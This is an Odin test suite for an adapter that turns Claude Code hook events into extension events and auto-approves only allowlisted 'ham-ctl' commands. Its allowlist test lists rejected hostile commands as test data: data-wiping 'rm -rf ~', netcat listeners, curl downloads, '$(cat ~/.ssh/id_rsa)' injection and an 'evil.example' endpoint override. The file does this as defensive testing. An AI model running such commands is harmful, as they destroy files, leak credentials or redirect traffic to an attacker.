package extension

// Claude adapter: every hook fixture captured by the T1 spike (Claude Code
// 2.1.295, testdata/claude/*.json) must map to valid ham.ext.v1. Notification,
// PostToolUseFailure and MultiEdit are synthetic (not observed in the spike;
// shapes follow the hook docs / older Claude releases).

import json "core:encoding/json"
import "core:strings"
import "core:testing"
import contracts "odin_test:contracts"

TS :: "2026-10-22T07:00:00.000Z"

@(private = "file")
Mapped_Event :: struct {
	ev:   contracts.Ext_Event,
	root: json.Object,
}

// map_fixture maps raw and validates every event with the shared contract
// parser (the same one the bridge uses), returning them in order.
@(private = "file")
map_fixture :: proc(t: ^testing.T, raw: string, permission_timeout_ms := 0) -> (Claude_Mapped, [dynamic]Mapped_Event) {
	mapped, err := claude_map_hook(raw, TS, permission_timeout_ms)
	testing.expect_value(t, err, Claude_Error.None)
	out := make([dynamic]Mapped_Event)
	for e in mapped.events {
		ev, perr := contracts.ext_parse_event(e)
		testing.expectf(t, perr == .None, "event must satisfy ham.ext.v1 (%v): %s", perr, e)
		v, jerr := json.parse_string(e, json.DEFAULT_SPECIFICATION, true)
		testing.expect(t, jerr == .None)
		root, _ := v.(json.Object)
		testing.expect_value(t, json_get_string(root, "provider"), "claude")
		testing.expect_value(t, json_get_string(root, "ext_version"), CLAUDE_EXT_VERSION)
		testing.expect_value(t, json_get_string(root, "ts"), TS)
		testing.expect(t, len(e) < contracts.EXT_EVENT_MAX_BYTES, "event stays under the 256KB cap")
		append(&out, Mapped_Event{ev, root})
	}
	return mapped, out
}

@(private = "file")
payload_of :: proc(m: Mapped_Event) -> json.Object {
	return json_get_object(m.root, "payload")
}

@(test)
test_claude_session_start_maps_hello_and_session :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	mapped, evs := map_fixture(t, #load("testdata/claude/session_start_startup.json", string))
	testing.expect_value(t, mapped.hook, Claude_Hook.Session_Start)
	testing.expect_value(t, mapped.is_permission, false)
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Hello)
	testing.expect_value(t, evs[0].ev.session_id, "cf4b17bd-aa1d-4d65-8f7d-63529dbb8b9f")
	testing.expect_value(t, len(evs[0].ev.capabilities), 5)
	want := CLAUDE_CAPABILITIES
	for c, i in want do if i < len(evs[0].ev.capabilities) do testing.expect_value(t, evs[0].ev.capabilities[i], c)
	testing.expect_value(t, evs[1].ev.kind, contracts.Ext_Event_Kind.Session)
	testing.expect(t, strings.has_suffix(evs[1].ev.transcript_path, "cf4b17bd-aa1d-4d65-8f7d-63529dbb8b9f.jsonl"))
	p := payload_of(evs[1])
	testing.expect_value(t, json_get_string(p, "phase"), "start")
	testing.expect_value(t, json_get_string(p, "source"), "startup")
	testing.expect_value(t, json_get_string(p, "cwd"), "/home/dev/.cache/heimdall-spike/work")

	// Two events go to the bridge as one {"events":[…]} batch.
	params := event_params(mapped.events[:])
	split, serr := contracts.ext_split_events(params)
	testing.expect_value(t, serr, contracts.Ext_Error.None)
	testing.expect_value(t, len(split), 2)
}

@(test)
test_claude_session_start_clear_carries_new_session_id :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/session_start_clear.json", string))
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	testing.expect_value(t, evs[1].ev.session_id, "a18f90ab-d533-4e4b-8856-524cd68db533")
	testing.expect_value(t, json_get_string(payload_of(evs[1]), "source"), "clear")
}

@(test)
test_claude_session_end_maps_session_end :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/session_end_clear.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Session)
	testing.expect_value(t, json_get_string(payload_of(evs[0]), "phase"), "end")
	testing.expect_value(t, json_get_string(payload_of(evs[0]), "reason"), "clear")
}

@(test)
test_claude_user_prompt_submit_is_active_without_prompt_text :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	mapped, evs := map_fixture(t, #load("testdata/claude/user_prompt_submit.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Activity)
	status, ok := contracts.ext_activity_for_event(evs[0].ev)
	testing.expect(t, ok)
	testing.expect_value(t, status, "active")
	testing.expect(t, !strings.contains(mapped.events[0], "three lines"), "the prompt text is not forwarded")
}

@(test)
test_claude_stop_is_idle_and_counts_background_subagents :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/stop_background.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	status, ok := contracts.ext_activity_for_event(evs[0].ev)
	testing.expect(t, ok)
	testing.expect_value(t, status, "idle")
	n, _ := json_get_int(payload_of(evs[0]), "background_running")
	testing.expect_value(t, n, 1)
}

@(test)
test_claude_pre_tool_use_agent_maps_tool_start_with_description :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/pre_tool_use_agent.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	e := evs[0]
	testing.expect_value(t, e.ev.kind, contracts.Ext_Event_Kind.Tool_Start)
	testing.expect_value(t, e.ev.tool_name, "Agent")
	testing.expect_value(t, e.ev.tool_use_id, "toolu_01623KwpEEF9xjwB57fsokk6")
	testing.expect_value(t, e.ev.agent_id, "") // main thread
	p := payload_of(e)
	testing.expect_value(t, json_get_string(p, "description"), "cat c")
	testing.expect_value(t, json_get_string(p, "subagent_type"), "general-purpose")
	testing.expect_value(t, json_get_bool(p, "run_in_background"), false)
	input := json_get_object(json_get_object(e.root, "tool"), "input")
	testing.expect_value(t, json_get_string(input, "description"), "cat c")
}

@(test)
test_claude_tool_events_inside_subagent_carry_agent :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/pre_tool_use_subagent_bash.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect_value(t, evs[0].ev.agent_id, "a214dfca8e8a87ac6")
	testing.expect_value(t, evs[0].ev.agent_type, "general-purpose")
	testing.expect_value(t, evs[0].ev.tool_name, "Bash")
}

@(test)
test_claude_post_tool_use_agent_binds_subagent_id :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	mapped, evs := map_fixture(t, #load("testdata/claude/post_tool_use_agent.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Tool_End)
	p := payload_of(evs[0])
	testing.expect_value(t, json_get_string(p, "subagent_id"), "a214dfca8e8a87ac6")
	testing.expect_value(t, json_get_string(p, "subagent_status"), "completed")
	testing.expect_value(t, json_get_string(p, "status"), "ok")
	d, _ := json_get_int(p, "duration_ms")
	testing.expect_value(t, d, 4298)
	resp := json_get_object(json_get_object(evs[0].root, "tool"), "response")
	testing.expect_value(t, json_get_string(resp, "agentId"), "a214dfca8e8a87ac6")
	testing.expect(t, !json_has(resp, "prompt"), "the subagent prompt is dropped from tool.response")
	testing.expect(t, !strings.contains(mapped.events[0], `"usage"`))

	_, async_evs := map_fixture(t, #load("testdata/claude/post_tool_use_agent_async.json", string))
	testing.expect_value(t, len(async_evs), 1)
	if len(async_evs) != 1 do return
	ap := payload_of(async_evs[0])
	testing.expect_value(t, json_get_string(ap, "subagent_id"), "adedc1a3cdf12e0cd")
	testing.expect_value(t, json_get_string(ap, "subagent_status"), "async_launched")
	testing.expect_value(t, json_get_string(ap, "description"), "count lines")
}

@(test)
test_claude_subagent_start_and_stop :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, start := map_fixture(t, #load("testdata/claude/subagent_start.json", string))
	testing.expect_value(t, len(start), 1)
	if len(start) == 1 {
		testing.expect_value(t, start[0].ev.kind, contracts.Ext_Event_Kind.Subagent_Start)
		testing.expect_value(t, start[0].ev.agent_id, "a214dfca8e8a87ac6")
		testing.expect_value(t, start[0].ev.agent_type, "general-purpose")
	}
	_, stop := map_fixture(t, #load("testdata/claude/subagent_stop.json", string))
	testing.expect_value(t, len(stop), 1)
	if len(stop) == 1 {
		testing.expect_value(t, stop[0].ev.kind, contracts.Ext_Event_Kind.Subagent_Stop)
		testing.expect_value(t, stop[0].ev.agent_id, "a214dfca8e8a87ac6")
		p := payload_of(stop[0])
		testing.expect(t, strings.has_suffix(json_get_string(p, "agent_transcript_path"), "agent-a214dfca8e8a87ac6.jsonl"))
		testing.expect(t, json_get_string(p, "last_assistant_message") != "")
	}
}

@(test)
test_claude_post_tool_use_edit_emits_file_edit_diff :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	mapped, evs := map_fixture(t, #load("testdata/claude/post_tool_use_edit.json", string))
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Tool_End)
	resp := json_get_object(json_get_object(evs[0].root, "tool"), "response")
	testing.expect(t, !json_has(resp, "originalFile"), "whole-file fields are not duplicated in tool.response")
	testing.expect(t, !json_has(resp, "structuredPatch"))

	fe := evs[1]
	testing.expect_value(t, fe.ev.kind, contracts.Ext_Event_Kind.File_Edit)
	testing.expect_value(t, fe.ev.file_path, "/home/dev/.cache/heimdall-spike/work/a.txt")
	testing.expect_value(t, fe.ev.tool_use_id, "toolu_016Syz1EdRNSL36n6NfFhDsc")
	p := payload_of(fe)
	testing.expect_value(t, json_get_string(p, "operation"), "edit")
	testing.expect_value(t, json_get_string(p, "diff_source"), "structured_patch")
	testing.expect_value(t, json_get_string(p, "diff"),
		"--- a/a.txt\n+++ b/a.txt\n@@ -1,3 +1,3 @@\n line one\n-line two\n+line 2\n line three\n")
	adds, _ := json_get_int(p, "additions")
	dels, _ := json_get_int(p, "deletions")
	testing.expect_value(t, adds, 1)
	testing.expect_value(t, dels, 1)
	testing.expect(t, strings.contains(mapped.events[1], `"file_path":"/home/dev/.cache/heimdall-spike/work/a.txt"`))
}

@(test)
test_claude_edit_replace_all_diff :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/post_tool_use_edit_replace_all.json", string))
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	p := payload_of(evs[1])
	testing.expect_value(t, json_get_string(p, "diff"), "--- a/c.txt\n+++ b/c.txt\n@@ -1,3 +1,3 @@\n-x\n+z\n y\n-x\n+z\n")
	adds, _ := json_get_int(p, "additions")
	testing.expect_value(t, adds, 2)
}

@(test)
test_claude_write_create_synthesises_all_added_diff :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/post_tool_use_write_create.json", string))
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	p := payload_of(evs[1])
	testing.expect_value(t, json_get_string(p, "operation"), "create")
	testing.expect_value(t, json_get_string(p, "diff_source"), "content")
	testing.expect_value(t, json_get_string(p, "diff"),
		"--- /dev/null\n+++ b/b.txt\n@@ -0,0 +1,1 @@\n+hello\n\\ No newline at end of file\n")
}

@(test)
test_claude_write_update_uses_structured_patch :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/post_tool_use_write_update.json", string))
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	p := payload_of(evs[1])
	testing.expect_value(t, json_get_string(p, "operation"), "update")
	testing.expect_value(t, json_get_string(p, "diff"),
		"--- a/b.txt\n+++ b/b.txt\n@@ -1,1 +1,1 @@\n-hello\n\\ No newline at end of file\n+bye\n\\ No newline at end of file\n")
}

@(test)
test_claude_multi_edit_without_patch_falls_back_to_strings :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/post_tool_use_multi_edit.json", string))
	testing.expect_value(t, len(evs), 2)
	if len(evs) != 2 do return
	p := payload_of(evs[1])
	testing.expect_value(t, json_get_string(p, "operation"), "multi_edit")
	testing.expect_value(t, json_get_string(p, "diff_source"), "strings")
	testing.expect_value(t, json_get_string(p, "diff"),
		"--- a/a.txt\n+++ b/a.txt\n@@ -1,1 +1,1 @@\n-line one\n+line 1\n@@ -3,1 +3,1 @@\n-line three\n+line 3\n")
}

@(test)
test_claude_post_tool_use_failure_is_error_tool_end :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/post_tool_use_failure.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Tool_End)
	testing.expect_value(t, json_get_string(payload_of(evs[0]), "status"), "error")
	testing.expect_value(t, json_get_string(payload_of(evs[0]), "error"), "Exit code 1")
}

@(test)
test_claude_notification_permission_prompt_is_waiting_user :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	_, evs := map_fixture(t, #load("testdata/claude/notification.json", string))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect_value(t, evs[0].ev.kind, contracts.Ext_Event_Kind.Notification)
	testing.expect_value(t, evs[0].ev.notification_type, "permission_prompt")
	status, ok := contracts.ext_activity_for_event(evs[0].ev)
	testing.expect(t, ok)
	testing.expect_value(t, status, "waiting_user")
	testing.expect_value(t, json_get_string(payload_of(evs[0]), "message"), "Claude needs your permission to use Bash")
}

@(test)
test_claude_permission_request_maps_permission_event :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	mapped, evs := map_fixture(t, #load("testdata/claude/permission_request.json", string), 300_000)
	testing.expect(t, mapped.is_permission)
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	e := evs[0]
	testing.expect_value(t, e.ev.kind, contracts.Ext_Event_Kind.Permission_Request)
	testing.expect_value(t, e.ev.tool_name, "Bash")
	testing.expect_value(t, e.ev.tool_use_id, "") // Claude sends none
	input := json_get_object(json_get_object(e.root, "tool"), "input")
	testing.expect_value(t, json_get_string(input, "command"), "touch perm_empty.txt")
	p := payload_of(e)
	testing.expect_value(t, len(json_get_array(p, "permission_suggestions")), 2)
	timeout, _ := json_get_int(p, "timeout_ms")
	testing.expect_value(t, timeout, 300_000)
	testing.expect_value(t, json_get_string(p, "permission_mode"), "default")
}

@(test)
test_claude_unknown_or_malformed_hooks_map_to_nothing :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	m, err := claude_map_hook(`{"hook_event_name":"PreCompact","session_id":"s"}`, TS)
	testing.expect_value(t, err, Claude_Error.None)
	testing.expect_value(t, len(m.events), 0)
	_, err2 := claude_map_hook(`not json`, TS)
	testing.expect_value(t, err2, Claude_Error.Malformed_Json)
	_, err3 := claude_map_hook(`[1,2]`, TS)
	testing.expect_value(t, err3, Claude_Error.Malformed_Json)
}

@(test)
test_claude_large_tool_strings_are_clipped :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	big := strings.repeat("x", 200 * 1024)
	b := strings.builder_make()
	strings.write_string(&b, `{"session_id":"s","cwd":"/w","hook_event_name":"PreToolUse","tool_name":"Write","tool_use_id":"toolu_1","tool_input":{"file_path":"/w/big.txt","content":"`)
	strings.write_string(&b, big)
	strings.write_string(&b, `"}}`)
	mapped, evs := map_fixture(t, strings.to_string(b))
	testing.expect_value(t, len(evs), 1)
	if len(evs) != 1 do return
	testing.expect(t, len(mapped.events[0]) < 8 * 1024, "4KB string clip keeps tool.start small")
	input := json_get_object(json_get_object(evs[0].root, "tool"), "input")
	testing.expect_value(t, json_get_string(input, "file_path"), "/w/big.txt")
	testing.expect(t, strings.has_suffix(json_get_string(input, "content"), EXT_CLIP_MARKER))
}

// ── permission output ────────────────────────────────────────────────────────

@(test)
test_claude_permission_output_formats :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	testing.expect_value(t, claude_permission_output("allow", ""),
		`{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`)
	testing.expect_value(t, claude_permission_output("deny", `no "rm" here`),
		`{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"no \"rm\" here"}}}`)
	testing.expect_value(t, claude_permission_output("deny", ""),
		`{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Denied in Ninjy"}}}`)
	testing.expect_value(t, claude_permission_output("none", "timeout"), "")
	testing.expect_value(t, claude_permission_output("", ""), "")

	testing.expect_value(t, claude_permission_output_from_response(`{"v":1,"id":"x","ok":true,"data":{"request_id":"perm_1","decision":"allow","message":""}}` + "\n"),
		`{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`)
	testing.expect_value(t, claude_permission_output_from_response(`{"v":1,"id":"x","ok":true,"data":{"request_id":"perm_1","decision":"none","message":"hub unavailable"}}`), "")
	testing.expect_value(t, claude_permission_output_from_response(`{"v":1,"id":"x","ok":false,"error":{"code":"bad_request"}}`), "")
	testing.expect_value(t, claude_permission_output_from_response(``), "")
}

// ── hook_run (transport faked) ──────────────────────────────────────────────

@(private = "file", thread_local)
fake_calls: int
@(private = "file", thread_local)
fake_method: string
@(private = "file", thread_local)
fake_params: string
@(private = "file", thread_local)
fake_timeout_ms: int
@(private = "file", thread_local)
fake_response: string
@(private = "file", thread_local)
fake_ok: bool

@(private = "file")
fake_send :: proc(endpoint, token, method, params: string, timeout_ms: int) -> (string, bool) {
	fake_calls += 1
	fake_method = method
	fake_params = params
	fake_timeout_ms = timeout_ms
	return fake_response, fake_ok
}

@(private = "file")
fake_reset :: proc(response: string, ok: bool) {
	fake_calls = 0; fake_method = ""; fake_params = ""; fake_timeout_ms = 0
	fake_response = response; fake_ok = ok
}

ENV :: Hook_Env{endpoint = "unix:/tmp/none.sock", token = "hlat_x", ts = TS}

@(test)
test_hook_run_without_env_is_silent_noop :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	fake_reset(`{"ok":true,"data":{"decision":"allow"}}`, true)
	for env in ([]Hook_Env{{}, {endpoint = "unix:/x"}, {token = "hlat_x"}, {endpoint = "  ", token = "hlat_x"}}) {
		out := hook_run("claude", #load("testdata/claude/permission_request.json", string), env, fake_send)
		testing.expect_value(t, out, "")
	}
	testing.expect_value(t, fake_calls, 0)
}

@(test)
test_hook_run_non_permission_sends_event_and_prints_nothing :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	fake_reset(`{"ok":true,"data":{"accepted":2}}`, true)
	out := hook_run("claude", #load("testdata/claude/session_start_startup.json", string), ENV, fake_send)
	testing.expect_value(t, out, "")
	testing.expect_value(t, fake_calls, 1)
	testing.expect_value(t, fake_method, "agent.extension.event")
	testing.expect_value(t, fake_timeout_ms, EVENT_SOCKET_TIMEOUT_MS)
	testing.expect(t, strings.has_prefix(fake_params, `{"events":[`))

	// A dead bridge still prints nothing.
	fake_reset("", false)
	testing.expect_value(t, hook_run("claude", #load("testdata/claude/stop_background.json", string), ENV, fake_send), "")
	testing.expect_value(t, fake_calls, 1)
	testing.expect(t, !strings.has_prefix(fake_params, `{"events":`), "a single event is sent bare")
}

@(test)
test_hook_run_permission_prints_decision :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	raw := #load("testdata/claude/permission_request.json", string)

	fake_reset(`{"v":1,"id":"ham-ctl-agent","ok":true,"data":{"request_id":"perm_1","decision":"allow","message":""}}`, true)
	out := hook_run("claude", raw, ENV, fake_send)
	testing.expect_value(t, out, `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}`)
	testing.expect_value(t, fake_method, "agent.extension.permission")
	testing.expect_value(t, fake_timeout_ms, PERMISSION_RELAY_TIMEOUT_MS + PERMISSION_SOCKET_MARGIN_MS)
	testing.expect(t, strings.contains(fake_params, `"timeout_ms":300000`))

	fake_reset(`{"v":1,"id":"ham-ctl-agent","ok":true,"data":{"request_id":"perm_1","decision":"deny","message":"not on main"}}`, true)
	testing.expect_value(t, hook_run("claude", raw, ENV, fake_send),
		`{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"not on main"}}}`)

	fake_reset(`{"v":1,"id":"ham-ctl-agent","ok":true,"data":{"request_id":"perm_1","decision":"none","message":"timeout"}}`, true)
	testing.expect_value(t, hook_run("claude", raw, ENV, fake_send), "")

	fake_reset("", false)
	env_fail := ENV
	env_fail.permission_timeout_ms = 1_000
	testing.expect_value(t, hook_run("claude", raw, env_fail, fake_send), "")

	// A lowered relay timeout travels with the request and shortens the socket wait.
	fake_reset(`{"ok":true,"data":{"decision":"none"}}`, true)
	env := ENV
	env.permission_timeout_ms = 5_000
	_ = hook_run("claude", raw, env, fake_send)
	testing.expect(t, strings.contains(fake_params, `"timeout_ms":5000`))
	testing.expect_value(t, fake_timeout_ms, 5_000 + PERMISSION_SOCKET_MARGIN_MS)
}

@(test)
test_hook_run_unknown_provider_is_noop :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	fake_reset("", true)
	testing.expect_value(t, hook_run("unknown-provider", #load("testdata/claude/stop_background.json", string), ENV, fake_send), "")
	testing.expect_value(t, fake_calls, 0)
}

@(test)
test_is_ham_ctl_command_accepts_only_a_lone_allowlisted_invocation :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	BIN :: "/home/dev/run/bin/ham-ctl"
	CWD :: "/home/dev/run"
	for cmd in ([]string{
		"./bin/ham-ctl chat read",
		"./bin/ham-ctl task show task_1",
		"  ./bin/ham-ctl chat send --to user --body 'hi there'  ",
		"bin/ham-ctl lease heartbeat",
		"$HEIMDALL_CTL_BIN lease submit --summary done",
		BIN + " memory propose --title x",
		BIN + " agent start-success",
		BIN + " task show task_1",
		BIN + " task comment task_1 --body done",
		BIN + " chat send --to user --body \"looks good\"",
	}) {
		testing.expectf(t, is_ham_ctl_command(cmd, BIN, CWD), "should match: %q", cmd)
	}
	for cmd in ([]string{
		"",
		BIN,
		// Arbitrary execution / reconfiguration verbs always ask.
		BIN + " shell run --cmd 'rm -rf ~'",
		BIN + " shell run --cmd 'bash /tmp/x.sh'",
		BIN + " shell serve --cmd 'nc -l 9' --port 9",
		BIN + " hub agents update --agent-id a --permission-mode yolo",
		BIN + " agents new-instance agt_x",
		BIN + " bridge list",
		BIN + " task-chain fleet set c --agent a --capacity 9",
		BIN + " memory delete mem_1",
		// Verbs that write something later executed (brief.verify) or act for the user.
		BIN + " task update task_1 --verify 'curl -o /tmp/x http://e'",
		BIN + " task create --goal g --verify 'sh /tmp/x'",
		BIN + " task update task_1 --brief-file /tmp/b.json",
		BIN + " task publish task_1",
		// Connection / identity overrides always ask, however they are quoted.
		BIN + " chat read --bridge-endpoint tcp:evil.example:9",
		BIN + " chat send --to user --body hi --agent-token hlat_other",
		BIN + " lease next --bridge-endpoint=unix:/tmp/x.sock",
		BIN + " chat read '--bridge-endpoint' tcp:e:1",
		BIN + " chat read \"--agent\"-token hlat_x",
		BIN + " chat read \\--agent-token hlat_x",
		BIN + " chat read --agent-tok?n hlat_x",
		BIN + " task show t --hub-url http://e",
		BIN + " verify --config /tmp/c.toml",
		// The removed verify stub is no longer allowlisted.
		BIN + " verify",
		// review always asks (it can record a verdict as the user).
		BIN + " review post task_1 --verdict approve",
		BIN + " review post task_1 --verdict approve --on-behalf-of user",
		BIN + " review post task_1 --verdict approve --on-behalf-of=user",
		BIN + " review post task_1 --verdict approve '--on-behalf-of' user",
		BIN + " review post task_1 --verdict approve \"--on-behalf-of\" user",
		BIN + " review post task_1 --verdict approve --on-behalf\"\"-of user",
		BIN + " review post task_1 --verdict approve \\--on-behalf-of user",
		BIN + " review post task_1 --verdict approve --on-behalf-o? user",
		BIN + " chat set-title x",
		BIN + " --endpoint unix:/x chat read",
		// Shell shapes.
		BIN + " chat read && rm -rf ~",
		BIN + " chat read; rm -rf ~",
		BIN + " chat read | sh",
		BIN + " chat read & curl x",
		BIN + " chat read > /etc/passwd",
		BIN + " chat send --body \"$(cat ~/.ssh/id_rsa)\"",
		BIN + " chat send --body `id`",
		BIN + " chat send --body $HOME",
		BIN + " chat read\nrm -rf ~",
		"cd /tmp && " + BIN + " chat read",
		"${HEIMDALL_CTL_BIN} chat read",
		// Program identity.
		"ham-ctl chat read",
		"/usr/bin/ham-ctl chat read",
		BIN + "x chat read",
		"rm -rf ~ # ham-ctl",
	}) {
		testing.expectf(t, !is_ham_ctl_command(cmd, BIN, CWD), "should NOT match: %q", cmd)
	}
	// The relative wrapper only counts when it resolves to ctl_bin.
	testing.expect(t, !is_ham_ctl_command("./bin/ham-ctl chat read", BIN, "/tmp/evil"), "relative path from another cwd")
	testing.expect(t, !is_ham_ctl_command("./bin/ham-ctl chat read", BIN, ""), "relative path without cwd")
	testing.expect(t, !is_ham_ctl_command("./.heimdall/bin/ham-ctl chat read", BIN, CWD), "the pre-bin/ shim path is not the issued ctl_bin")
	testing.expect(t, !is_ham_ctl_command("$HEIMDALL_CTL_BIN chat read", "", CWD), "nothing matches without ctl_bin")
}

@(test)
test_hook_run_auto_approves_ham_ctl_bash_without_bridge :: proc(t: ^testing.T) {
	context.allocator = context.temp_allocator
	defer free_all(context.temp_allocator)
	env := ENV
	env.ctl_bin = "/home/dev/run/bin/ham-ctl"
	raw := `{"session_id":"s1","cwd":"/home/dev/run","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"./bin/ham-ctl chat read"}}`
	fake_reset(`{"ok":true,"data":{"decision":"deny"}}`, true)
	out := hook_run("claude", raw, env, fake_send)
	testing.expect_value(t, out, claude_permission_output("allow", ""))
	testing.expect_value(t, fake_calls, 0)

	// shell run through ham-ctl still goes to the bridge relay.
	shell := `{"session_id":"s1","cwd":"/home/dev/run","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"./bin/ham-ctl shell run --cmd 'rm -rf ~'"}}`
	fake_reset(`{"ok":true,"data":{"decision":"deny"}}`, true)
	out = hook_run("claude", shell, env, fake_send)
	testing.expect_value(t, fake_calls, 1)
	testing.expect_value(t, fake_method, "agent.extension.permission")
	testing.expect_value(t, out, claude_permission_output("deny", ""))

	// Not Bash: never auto-approved.
	write := `{"session_id":"s1","cwd":"/home/dev/run","hook_event_name":"PermissionRequest","tool_name":"Write","tool_input":{"file_path":"ham-ctl","content":"x"}}`
	fake_reset(`{"ok":true,"data":{"decision":"allow"}}`, true)
	_ = hook_run("claude", write, env, fake_send)
	testing.expect_value(t, fake_calls, 1)

	// Without ctl_bin (HEIMDALL_CTL_BIN unset) nothing is auto-approved.
	fake_reset(`{"ok":true,"data":{"decision":"deny"}}`, true)
	_ = hook_run("claude", raw, ENV, fake_send)
	testing.expect_value(t, fake_calls, 1)
}
